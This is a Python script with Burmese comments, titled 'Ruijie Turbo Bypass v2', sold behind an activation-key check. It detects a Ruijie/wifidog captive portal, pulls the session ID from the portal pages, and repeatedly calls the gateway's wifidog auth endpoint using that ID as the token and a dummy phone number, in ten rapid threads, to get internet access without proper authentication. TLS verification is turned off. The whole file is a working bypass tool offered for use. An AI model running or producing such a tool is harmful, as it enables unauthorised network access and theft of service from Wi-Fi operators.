import requests
import re
import urllib3
import time
import threading
import hashlib
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin

# Error message များ မပြစေရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- SETTINGS ---
PING_THREADS = 10
PING_INTERVAL = 0.1 
SECRET_SALT = "FIXED_SALT_999" # ဤစာသားသည် keys.py နှင့် တူရမည်
LICENSE_FILE = "license.txt"

def get_device_id():
    """Termux နှင့် Android ဖုန်းများတွင် ID မပြောင်းလဲစေရန် Hardware Info ကို ဖတ်ခြင်း"""
    try:
        if os.path.exists("/proc/cpuinfo"):
            with open("/proc/cpuinfo", "r") as f:
                data = f.read()
                # CPU အချက်အလက်များကို Hash လုပ်ပြီး ID ထုတ်ယူခြင်း
                return hashlib.md5(data.encode()).hexdigest()[:12].upper()
        # အကယ်၍ CPU info ဖတ်မရပါက Node ID ကို သုံးမည်
        return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:12].upper()
    except:
        return "DEV-FIXED-ID"

def verify_license(device_id, user_key):
    """License Key ကို Salt သုံးပြီး စစ်ဆေးခြင်း"""
    check = hashlib.sha256((device_id + SECRET_SALT).encode()).hexdigest()[:16].upper()
    return user_key == check

def check_real_internet():
    """Internet Access ရမရ စစ်ဆေးခြင်း"""
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def high_speed_ping(auth_link, session, sid):
    """Portal ကို ကျော်ရန် Auth Link ကို အဆက်မပြတ် Ping ထိုးပေးခြင်း"""
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except:
            break
        time.sleep(PING_INTERVAL)

def start_process():
    device_id = get_device_id()
    print(f"\n==============================")
    print(f"   RUIJIE TURBO BYPASS v2")
    print(f"==============================")
    print(f"DEVICE ID: {device_id}")

    # ၁။ သိမ်းဆည်းထားသော License ရှိမရှိ စစ်ဆေးခြင်း
    saved_key = None
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            saved_key = f.read().strip()
            if not verify_license(device_id, saved_key):
                saved_key = None

    # ၂။ License မရှိလျှင် သို့မဟုတ် မှားနေလျှင် အသစ်တောင်းခြင်း
    if not saved_key:
        user_key = input("Enter Activation Key: ").strip()
        if verify_license(device_id, user_key):
            with open(LICENSE_FILE, "w") as f:
                f.write(user_key)
            print("[+] Activation Success!")
        else:
            print("[!] Invalid Key! Please contact admin.")
            if os.path.exists(LICENSE_FILE): os.remove(LICENSE_FILE)
            return
    else:
        print("[+] License Verified!")

    # ၃။ Bypass လုပ်ငန်းစဉ် စတင်ခြင်း
    print(f"[*] Initializing Bypass Logic...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # Portal မှ SID နှင့် လိုအပ်သော Parameter များ ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                # အင်တာနက်ရသွားသည်အထိ စောင့်ကြည့်ခြင်း
                while True:
                    time.sleep(5)
                    if check_real_internet(): break

        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    start_process()
